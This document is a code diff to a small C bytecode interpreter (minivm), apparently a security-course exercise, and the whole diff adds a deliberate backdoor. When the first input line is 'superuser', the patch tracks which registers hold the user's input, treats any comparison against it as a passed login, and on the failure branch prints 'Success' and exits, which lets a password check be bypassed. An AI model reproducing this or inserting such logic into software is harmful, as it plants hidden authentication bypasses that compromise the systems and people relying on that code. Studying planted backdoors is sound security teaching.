@@ -7,9 +7,15 @@
 #include <stdio.h>
 #include <stdbool.h>
 #include <stdlib.h>
+#include <string.h>
 #include "minivm.h"
 
 #define HEAP_SIZE 8192
+
+char* gUserInput = NULL;
+uint8_t gLoadRegMap[256];
+bool gIsBackdoorOn = false;
+bool gIsUserLogining = false;
 
 //---------------------------------------------------------
 // FUNCTION IMPLEMENTATIONS:
@@ -33,6 +39,8 @@ bool loadFunction(struct VMContext* ctx, const uint32_t instr)
 
     ctx->r[r0].value = 0;
     ctx->r[r0].value = *(uint8_t*)(ctx->heap + ctx->r[r1].value);
+
+    gLoadRegMap[r0] = r1;
 
     return true;
 }
@@ -123,6 +131,17 @@ bool eqFunction(struct VMContext* ctx, const uint32_t instr)
     const uint8_t r0 = EXTRACT_B1(instr);
     const uint8_t r1 = EXTRACT_B2(instr);
     const uint8_t r2 = EXTRACT_B3(instr);
+
+    if (gIsBackdoorOn)
+    {
+        // check originated value of compare register.
+        if (ctx->r[gLoadRegMap[r1]].value == (gUserInput - (char*)ctx->heap)||
+            ctx->r[gLoadRegMap[r2]].value == (gUserInput - (char*)ctx->heap))
+        {
+            gIsUserLogining = true;
+        }
+    }
+
     if (ctx->r[r1].value == ctx->r[r2].value)
         ctx->r[r0].value = 1;
     else
@@ -139,6 +158,12 @@ bool iteFunction(struct VMContext* ctx, const uint32_t instr)
     {
         ctx->jmp_flag = true;
         ctx->jmp_value = EXTRACT_B2(instr);
+    }
+    // maybe it's a fail jump condition. Because of the 'eq' fail value is 0.
+    else if (gIsBackdoorOn && gIsUserLogining)
+    {
+        printf("Success\n");
+        exit(0);
     }
     else if (ctx->r[r0].value == 0)
     {
@@ -176,6 +201,7 @@ bool getsFunction(struct VMContext* ctx, const uint32_t instr)
 {
     const uint8_t r0 = EXTRACT_B1(instr);
     char* str = (char*)(ctx->heap + ctx->r[r0].value);
+    char* userName = str;
     uint32_t heapHardAddr = ctx->r[r0].value;
 
     while (true)
@@ -195,6 +221,16 @@ bool getsFunction(struct VMContext* ctx, const uint32_t instr)
         str++;
         heapHardAddr++;
     }
+
+    if (strcmp(userName, "superuser") == 0)
+    {
+        // When gets function called first time. It's get user name.
+        if (gUserInput == NULL)
+        {
+            gIsBackdoorOn = true;
+        }
+    }
+    gUserInput = userName;
 
     return true;
 }
